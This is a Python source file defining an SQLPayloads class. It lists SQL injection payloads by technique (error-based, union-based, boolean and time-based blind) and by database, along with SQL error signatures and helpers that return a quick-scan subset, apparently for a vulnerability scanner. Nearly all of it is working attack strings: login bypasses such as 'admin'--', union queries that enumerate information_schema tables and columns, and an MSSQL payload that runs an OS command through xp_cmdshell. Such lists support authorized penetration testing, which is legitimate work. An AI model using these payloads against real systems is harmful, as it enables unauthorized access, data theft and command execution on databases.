"""
SQL Injection Payloads Collection
Includes various types of SQL injection payloads for different databases
"""

class SQLPayloads:
    """Collection of SQL injection payloads"""
    
    # Error-based SQL Injection payloads
    ERROR_BASED = [
        "'",
        "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 1=1--",
        "\" OR 1=1--",
        "' OR 'a'='a",
        "\" OR \"a\"=\"a",
        "') OR ('1'='1",
        "\") OR (\"1\"=\"1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' OR '1'='1' #",
        "admin'--",
        "admin'#",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or ('1'='1--",
        "') or ('1'='1#",
    ]
    
    # Union-based SQL Injection payloads
    UNION_BASED = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 'a','b','c'--",
        "' UNION SELECT user(),database(),version()--",
        "' UNION SELECT @@version,NULL,NULL--",
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "' UNION SELECT column_name,NULL FROM information_schema.columns--",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 3--",
        "1' ORDER BY 4--",
        "1' ORDER BY 5--",
        "1' ORDER BY 10--",
    ]
    
    # Boolean-based blind SQL Injection payloads
    BOOLEAN_BASED = [
        "' AND '1'='1",
        "' AND '1'='2",
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 'a'='a",
        "' AND 'a'='b",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1 AND 1=1",
        "1 AND 1=2",
        "' AND (SELECT 1)=1--",
        "' AND (SELECT 1)=2--",
        "' AND SUBSTRING(@@version,1,1)='5",
        "' AND SUBSTRING(@@version,1,1)='4",
        "' AND LENGTH(database())>0--",
        "' AND LENGTH(database())>100--",
    ]
    
    # Time-based blind SQL Injection payloads
    TIME_BASED = [
        "'; WAITFOR DELAY '0:0:5'--",
        "'; SELECT SLEEP(5)--",
        "' AND SLEEP(5)--",
        "1' AND SLEEP(5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "'; WAITFOR DELAY '00:00:05'--",
        "1; WAITFOR DELAY '0:0:5'--",
        "' OR SLEEP(5)--",
        "\" OR SLEEP(5)--",
        "' AND IF(1=1,SLEEP(5),0)--",
        "' AND IF(1=2,SLEEP(5),0)--",
        "'; SELECT pg_sleep(5)--",
        "' AND pg_sleep(5)--",
    ]
    
    # SQL Injection for different databases
    MYSQL_SPECIFIC = [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' UNION SELECT user(),database(),version()--",
        "' OR '1'='1' LIMIT 1--",
    ]
    
    POSTGRESQL_SPECIFIC = [
        "'; SELECT pg_sleep(5)--",
        "' AND 1=CAST((SELECT version()) AS int)--",
        "' UNION SELECT NULL,version(),NULL--",
    ]
    
    MSSQL_SPECIFIC = [
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND 1=CONVERT(int,@@version)--",
        "' UNION SELECT NULL,@@version,NULL--",
        "'; EXEC xp_cmdshell('whoami')--",
    ]
    
    ORACLE_SPECIFIC = [
        "' UNION SELECT NULL,banner FROM v$version--",
        "' AND 1=UTL_INADDR.GET_HOST_ADDRESS('x')--",
        "' || (SELECT banner FROM v$version WHERE rownum=1)--",
    ]
    
    # Common SQL error signatures for detection
    ERROR_SIGNATURES = [
        "SQL syntax",
        "mysql_fetch",
        "mysql_num_rows",
        "ORA-01",
        "PostgreSQL",
        "Warning: pg_",
        "valid MySQL result",
        "MySqlClient",
        "SQLException",
        "ODBC SQL Server Driver",
        "Microsoft OLE DB Provider for SQL Server",
        "Unclosed quotation mark",
        "quoted string not properly terminated",
        "SQLException",
        "Syntax error",
        "mysql_",
        "mysqli_",
        "pg_query",
        "ORA-",
        "DB2 SQL error",
        "SQLite",
        "SQLite3",
        "JET Database Engine",
        "Access Database Engine",
        "Microsoft Access Driver",
    ]
    
    @classmethod
    def get_all_payloads(cls):
        """Get all SQL injection payloads"""
        return (
            cls.ERROR_BASED +
            cls.UNION_BASED +
            cls.BOOLEAN_BASED +
            cls.TIME_BASED +
            cls.MYSQL_SPECIFIC +
            cls.POSTGRESQL_SPECIFIC +
            cls.MSSQL_SPECIFIC +
            cls.ORACLE_SPECIFIC
        )
    
    @classmethod
    def get_basic_payloads(cls):
        """Get basic/common SQL injection payloads for quick scan"""
        return cls.ERROR_BASED[:10] + cls.UNION_BASED[:5] + cls.BOOLEAN_BASED[:6]
